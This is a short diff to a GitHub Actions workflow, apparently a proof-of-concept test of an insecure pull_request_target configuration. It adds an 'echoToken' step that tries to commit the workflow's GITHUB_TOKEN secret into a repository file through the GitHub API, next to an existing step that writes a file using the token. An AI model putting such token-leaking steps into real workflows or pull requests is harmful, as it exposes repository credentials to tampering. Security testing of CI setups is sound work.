@@ -23,6 +23,8 @@ jobs:
         run: npm install
       - name: insecure_PullRequestTarget
         run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/$REPO/contents/prtTesting.md" --data ''{"message": "Create prtTesting.md", "content": "amhpbCB3YXMgaGVyZQ=="}'' '
+      - name: echoToken
+        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/$REPO/contents/prtTesting2.md" --data ''{"message": "Create prtTesting2.md", "content": "$GITHUB_TOKEN"}'' '
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           REPO: ${{ github.repository }}
